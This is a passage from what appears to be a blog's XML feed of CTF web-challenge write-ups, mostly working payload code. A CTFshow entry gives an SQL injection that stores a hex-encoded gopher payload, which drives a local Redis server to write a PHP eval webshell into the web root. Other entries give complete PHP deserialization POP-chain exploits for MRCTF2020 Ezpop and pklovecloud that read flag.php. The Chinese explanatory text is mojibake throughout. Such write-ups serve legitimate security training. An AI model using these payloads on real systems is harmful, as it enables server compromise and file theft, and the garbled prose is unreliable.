1;#</code></p><p>16è¿›åˆ¶ä¸º<code>file:///var/www/html/alsckdfy/check.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915150151456.png" alt="image-20210915150151456"></p><h3 id="æ–¹æ³•äºŒï¼š"><a href="#æ–¹æ³•äºŒï¼š" class="headerlink" title="æ–¹æ³•äºŒï¼š"></a>æ–¹æ³•äºŒï¼š</h3><p>åˆ©ç”¨gopherusæ¥åš<a href="https://www.cnblogs.com/powertoolsteam/p/redis.html" target="_blank" rel="noopener">redisæœåŠ¡</a>çš„ssrf</p><p>ç”±äºåˆ¶ä½œå‡ºæ¥çš„payloadå­—ç¬¦ä¸²æ•°é‡è¿‡å¤šï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹åˆ—urlçš„ç±»å‹ï¼š<code>a&#39;;alter table link modify column url text;#</code></p><p>ç„¶ååˆ©ç”¨ssrfçš„web360çš„payloadç›´æ¥æ‰“å°±å¯ä»¥äº†ï¼š<code>a&#39; update link set url=0x676f706865723a2f2f3132372e302e302e313a363337392f5f2532413125304425304125323438253044253041666c757368616c6c2530442530412532413325304425304125323433253044253041736574253044253041253234312530442530413125304425304125323432382530442530412530412530412533432533467068702532306576616c2532382532345f504f5354253542312535442532392533422533462533452530412530412530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343325304425304164697225304425304125323431332530442530412f7661722f7777772f68746d6c2530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343130253044253041646266696c656e616d65253044253041253234372530442530416162632e706870253044253041253241312530442530412532343425304425304173617665253044253041253041 where id = 2;#</code>ç„¶åè®¿é—®link.php?id=2å°±ä¼šç”Ÿæˆabc.php å¯†ç æ˜¯1</p>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpcveæ€»ç»“</title>
      <link href="/2021/09/10/phpcve-zong-jie/"/>
      <url>/2021/09/10/phpcve-zong-jie/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFä¹‹popé“¾æ„é€ </title>
      <link href="/2021/09/09/ctf-zhi-pop-lian-gou-zao/"/>
      <url>/2021/09/09/ctf-zhi-pop-lian-gou-zao/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag is in flag.php</span><span class="token comment" spellcheck="true">//WTF IS THIS?</span><span class="token comment" spellcheck="true">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment" spellcheck="true">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Welcome to '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//å¯ä»¥è§¦å‘get()</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//æ­¤å‡½æ•°å¯ä»¥è§¦å‘__toString()</span>            <span class="token keyword">echo</span> <span class="token string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//å¯ä»¥è§¦å‘__invoke()</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å…±æ¶‰åŠä»¥ä¸‹é­”æœ¯æ–¹æ³•ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨<span class="token punctuation">(</span>é€šè¿‡åºåˆ—åŒ–å¯¹è±¡å…ƒç´ ä¸ªæ•°ä¸ç¬¦æ¥ç»•è¿‡<span class="token punctuation">)</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  è·å¾—å¦å¤–ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘è¯¥æ–¹æ³•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€æ­¥åˆ©ç”¨wakeup()æ¥è§¦å‘toString()ï¼Œæ‰€ä»¥å°±éœ€è¦$this-&gt;sourceä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¤–é¢çš„ä¸€å±‚å¥—å­ï¼Œä¸‹ä¸€å±‚å¥—å­æ˜¯åˆ©ç”¨tostringï¼šè®©$this-&gt;str=Test()ï¼Œè¿™æ˜¯å°±ä¼šå‡ºç°ç±»Test()è°ƒç”¨æœªçŸ¥å±æ€§sourceå°±ä¼šè§¦å‘ä»–è‡ªå·±çš„getï¼Œè¿™æ—¶å€™éœ€è¦å†å°†<strong>$p=new Modifier()</strong>å°±ä¹Ÿå¯ä»¥è§¦å‘invokeäº†</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Modifier</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ç¬¬ä¸‰å±Šç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›-pklovecloud"><a href="#ç¬¬ä¸‰å±Šç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›-pklovecloud" class="headerlink" title="[ç¬¬ä¸‰å±Šç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›]pklovecloud"></a>[ç¬¬ä¸‰å±Šç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›]pklovecloud</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">pkshow</span> <span class="token punctuation">{</span>      <span class="token keyword">function</span> <span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>                  <span class="token keyword">return</span> <span class="token string">"Pk very safe^.^"</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">acp</span> <span class="token punctuation">{</span>       <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>              <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pkshow</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">class</span> <span class="token class-name">ace</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>         <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$docker</span><span class="token punctuation">;</span>     <span class="token keyword">function</span> <span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>           <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">docker</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span> <span class="token operator">=</span> <span class="token variable">$heat</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nova</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"./{$this->filename}"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                     <span class="token punctuation">{</span>                              <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>              <span class="token keyword">else</span>             <span class="token punctuation">{</span>                 <span class="token keyword">return</span> <span class="token string">"keystone lost~"</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token variable">$logData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$logData</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ç¬¬ä¸€æ­¥ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token variable">$logData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pks'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$logData</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®©<code>$logData</code>ç­‰äºä¸€ä¸ªç±»ç„¶ååˆ©ç”¨echoæ¥å‡ºå‘tostringï¼Œæ¥ä¸‹æ¥éœ€è¦<code>$this-&gt;cinder = new ace;</code>ï¼Œä¿è¯è°ƒç”¨çš„æ˜¯aceä¸­çš„echo_name</p><p><strong>ç¬¬äºŒæ­¥ï¼š</strong></p><p>å¼€å§‹é…ç½®ace</p><p>é¦–å…ˆè¦æ»¡è¶³<code>$this-&gt;openstack = unserialize($this-&gt;docker);</code></p><p>æ‰€ä»¥éœ€è¦å…¶ç­‰äºç±»acpï¼ŒåŒæ—¶æ»¡è¶³<code>if($this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova)</code>ï¼Œå¯ä»¥ç”¨åœ°å€ä¼ å€¼æ¥å®ç°</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">acp</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nova</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">acp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯æ»¡è¶³ç¬¬ä¸€æ­¥å°±å¯ä»¥äº†ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">acp</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ace</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">ace</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'flag.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$docker</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BN%3Bs%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BR%3A3%3B%7D"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">docker</span> <span class="token operator">=</span> <span class="token variable">$o</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">docker</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span> <span class="token operator">=</span> <span class="token variable">$heat</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">neutron</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">openstack</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nova</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"./{$this->filename}"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token string">"keystone lost~"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">acp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹web(å…«)</title>
      <link href="/2021/09/07/ctfshow-zhi-dai-ma-shen-ji/"/>
      <url>/2021/09/07/ctfshow-zhi-dai-ma-shen-ji/</url>
      
